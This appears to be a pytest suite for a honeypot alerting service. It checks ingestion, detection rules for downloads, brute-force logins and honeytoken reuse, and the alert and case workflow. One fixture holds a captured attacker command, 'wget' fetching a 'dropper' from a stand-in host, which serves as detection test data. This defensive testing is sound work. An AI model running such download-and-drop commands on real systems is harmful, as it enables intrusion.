from aegis_nexus.app import create_app
from aegis_nexus.honeytokens import honeytoken_credential


def _app(tmp_path):
    return create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
    })


def test_ingestion_creates_evidence_backed_alert_and_alert_api_supports_lifecycle(tmp_path):
    client = _app(tmp_path).test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": "203.0.113.40",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget http://example.invalid/dropper",
            },
        },
    )
    assert response.status_code == 201
    event_id = response.get_json()["id"]

    queue = client.get("/api/v1/alerts").get_json()["items"]
    assert len(queue) == 1
    alert = queue[0]
    assert alert["rule_id"] == "download_attempt"
    assert alert["severity"] == "medium"
    assert alert["confidence"] == 90
    assert alert["status"] == "new"
    assert alert["evidence"][0]["id"] == event_id
    assert alert["related_session_ids"]
    assert any(item["type"] in {"url", "domain"} for item in alert["related_iocs"])
    assert all(item["provenance"] == "derived" for item in alert["related_iocs"])

    case = client.post(
        "/api/v1/cases",
        json={"title": "Alert investigation", "severity": "medium", "tags": ["alert"]},
    )
    assert case.status_code == 201
    case_id = case.get_json()["id"]
    linked = client.post(
        f"/api/v1/cases/{case_id}/evidence",
        json={"type": "alert", "id": alert["id"]},
    )
    assert linked.status_code == 200
    alert_evidence = next(item for item in linked.get_json()["evidence"] if item["evidence_type"] == "alert")
    assert alert_evidence["available"] is True
    assert alert_evidence["summary"]["rule_id"] == "download_attempt"
    assert alert_evidence["summary"]["classification_provenance"] == "detection_rule"

    patched = client.patch(
        f"/api/v1/alerts/{alert['id']}",
        json={"status": "investigating", "tags": ["validated"]},
    )
    assert patched.status_code == 200
    assert patched.get_json()["status"] == "investigating"

    noted = client.post(
        f"/api/v1/alerts/{alert['id']}/notes",
        json={"body": "Reviewing captured download command."},
    )
    assert noted.status_code == 201
    assert noted.get_json()["notes"][0]["body"] == "Reviewing captured download command."


def test_suricata_ingestion_creates_alert_without_attribution(tmp_path):
    client = _app(tmp_path).test_client()
    response = client.post(
        "/api/v1/integrations/suricata/eve",
        headers={"X-Aegis-Key": "secret", "X-Aegis-Sensor": "suricata-01"},
        json={
            "timestamp": "2026-09-23T10:00:00Z",
            "event_type": "alert",
            "src_ip": "203.0.113.41",
            "dest_ip": "192.0.2.10",
            "dest_port": 22,
            "proto": "TCP",
            "app_proto": "ssh",
            "flow_id": 424242,
            "alert": {"signature": "Test high severity", "signature_id": 42, "severity": 1},
        },
    )
    assert response.status_code == 201
    queue = client.get("/api/v1/alerts?severity=high").get_json()["items"]
    assert any(item["rule_id"] == "suricata_high_severity" for item in queue)
    item = next(item for item in queue if item["rule_id"] == "suricata_high_severity")
    assert "threat_actor" not in item
    assert "actor" not in item
    assert "attribution" not in item


def test_alert_api_rejects_invalid_status_and_sensor_network_access(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
        "SENSOR_SOURCE_CIDRS": {"ssh-1": "172.31.101.0/24"},
    })
    client = app.test_client()
    denied = client.get("/api/v1/alerts", environ_base={"REMOTE_ADDR": "172.31.101.10"})
    assert denied.status_code == 403

    missing = client.patch("/api/v1/alerts/not-found", json={"status": "bogus"})
    assert missing.status_code == 422


def test_temporal_detection_creates_aggregated_alert_from_historical_evidence(tmp_path):
    client = _app(tmp_path).test_client()
    event_ids = []
    for minute in range(5):
        response = client.post(
            "/api/v1/events",
            headers={"X-Aegis-Key": "secret"},
            json={
                "timestamp": f"2020-01-01T10:0{minute}:00Z",
                "honeypot": "ssh-1",
                "event_type": "credential",
                "observed": {
                    "source_ip": "203.0.113.88",
                    "service": "ssh",
                    "protocol": "tcp",
                    "destination_port": 22,
                    "credential": {"username": "root", "password": f"fixture-{minute}"},
                },
            },
        )
        assert response.status_code == 201
        event_ids.append(response.get_json()["id"])

    queue = client.get("/api/v1/alerts").get_json()["items"]
    alert = next(item for item in queue if item["rule_id"] == "multiple_auth_failures")
    assert alert["status"] == "new"
    assert {item["id"] for item in alert["evidence"]} == set(event_ids)
    assert alert["confidence"] == 95



def test_honeytoken_reuse_creates_high_fidelity_alert_after_credential_redaction(tmp_path, monkeypatch):
    monkeypatch.setenv("AEGIS_HONEYTOKEN_SEED", "integration-honeytoken-seed")
    token = honeytoken_credential()
    assert token is not None
    client = _app(tmp_path).test_client()

    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "web-decoy-01",
            "event_type": "credential",
            "observed": {
                "source_ip": "203.0.113.150",
                "service": "http",
                "protocol": "tcp",
                "destination_port": 8080,
                "credential": {
                    "username": token.username,
                    "password": token.password,
                },
            },
        },
    )
    assert response.status_code == 201
    event_id = response.get_json()["id"]

    queue = client.get("/api/v1/alerts?severity=high").get_json()["items"]
    alert = next(item for item in queue if item["rule_id"] == "honeytoken_reuse")
    assert alert["confidence"] == 100
    assert alert["evidence"] == [
        {
            "type": "event",
            "id": event_id,
            "added_at": alert["evidence"][0]["added_at"],
        }
    ]
    assert token.password not in str(alert)
    assert token.password_sha256 not in str(alert)
